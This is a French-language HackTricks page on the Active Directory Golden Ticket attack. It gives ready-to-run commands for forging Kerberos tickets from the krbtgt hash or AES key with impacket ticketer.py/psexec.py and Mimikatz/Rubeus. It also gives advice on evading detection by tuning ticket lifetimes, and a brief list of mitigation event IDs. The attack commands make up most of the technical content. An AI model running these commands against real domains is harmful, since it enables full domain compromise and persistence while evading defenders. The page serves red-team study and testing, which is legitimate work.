# Golden Ticket

<details>

<summary><strong>Apprenez le piratage AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* Découvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs exclusifs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux dépôts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Golden ticket

Un **TGT valide en tant qu'utilisateur** peut être créé **en utilisant le hash NTLM du compte krbtgt AD**. L'avantage de forger un TGT au lieu d'un TGS est de pouvoir **accéder à n'importe quel service** (ou machine) dans le domaine et l'utilisateur impersonné.\
De plus, les **identifiants** de **krbtgt** ne sont **jamais** **changés** automatiquement.

Le **hash NTLM** du compte **krbtgt** peut être **obtenu** à partir du **processus lsass** ou du fichier **NTDS.dit** de n'importe quel DC dans le domaine. Il est également possible d'obtenir ce NTLM via une **attaque DCsync**, qui peut être réalisée soit avec le module [lsadump::dcsync](https://github.com/gentilkiwi/mimikatz/wiki/module-\~-lsadump) de Mimikatz, soit avec l'exemple impacket [secretsdump.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py). Habituellement, des **privilèges d'administrateur de domaine ou similaires sont requis**, quelle que soit la technique utilisée.

Il faut également prendre en compte qu'il est possible ET **PRÉFÉRABLE** (opsec) de **forger des tickets en utilisant les clés Kerberos AES (AES128 et AES256)**.

{% code title="Depuis Linux" %}
```bash
python ticketer.py -nthash 25b2076cda3bfd6209161a6c78a69c1c -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain jurassic.park stegosaurus
export KRB5CCNAME=/root/impacket-examples/stegosaurus.ccache
python psexec.py jurassic.park/stegosaurus@lab-wdc02.jurassic.park -k -no-pass
```
```
{% endcode %}

{% code title="Depuis Windows" %}
```
```bash
#mimikatz
kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt
.\Rubeus.exe ptt /ticket:ticket.kirbi
klist #List tickets in memory

# Example using aes key
kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /aes256:430b2fdb13cc820d73ecf123dddd4c9d76425d4c2156b89ac551efb9d591a439 /ticket:golden.kirbi
```
{% endcode %}

**Une fois** que vous avez injecté le **Golden Ticket**, vous pouvez accéder aux fichiers partagés **(C$)**, exécuter des services et WMI, donc vous pourriez utiliser **psexec** ou **wmiexec** pour obtenir un shell (il semble que vous ne pouvez pas obtenir un shell via winrm).

### Contourner les détections communes

Les méthodes les plus fréquentes pour détecter un Golden Ticket sont par **l'inspection du trafic Kerberos** sur le réseau. Par défaut, Mimikatz **signe le TGT pour 10 ans**, ce qui sera considéré comme anormal dans les requêtes TGS subséquentes faites avec.

`Lifetime : 3/11/2021 12:39:57 PM ; 3/9/2031 12:39:57 PM ; 3/9/2031 12:39:57 PM`

Utilisez les paramètres `/startoffset`, `/endin` et `/renewmax` pour contrôler le décalage de début, la durée et le nombre maximum de renouvellements (tous en minutes).
```
Get-DomainPolicy | select -expand KerberosPolicy
```
Malheureusement, la durée de vie du TGT n'est pas enregistrée dans les événements 4769, donc vous ne trouverez pas cette information dans les journaux d'événements Windows. Cependant, ce que vous pouvez corréler, c'est **voir des 4769** _**sans**_ **un 4768 préalable**. Il est **impossible de demander un TGS sans un TGT**, et s'il n'y a pas d'enregistrement d'émission d'un TGT, nous pouvons en déduire qu'il a été falsifié hors ligne.

Pour **contourner cette détection**, consultez les billets diamant :

{% content-ref url="diamond-ticket.md" %}
[diamond-ticket.md](diamond-ticket.md)
{% endcontent-ref %}

### Atténuation

* 4624 : Connexion de compte
* 4672 : Connexion administrateur
* `Get-WinEvent -FilterHashtable @{Logname='Security';ID=4672} -MaxEvents 1 | Format-List –Property`

Une autre petite astuce que les défenseurs peuvent utiliser est **d'alerter sur les 4769 pour les utilisateurs sensibles** tels que le compte administrateur de domaine par défaut.

[**Plus d'informations sur le Golden Ticket sur ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets)

<details>

<summary><strong>Apprenez le piratage AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* Découvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-moi** sur **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux dépôts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
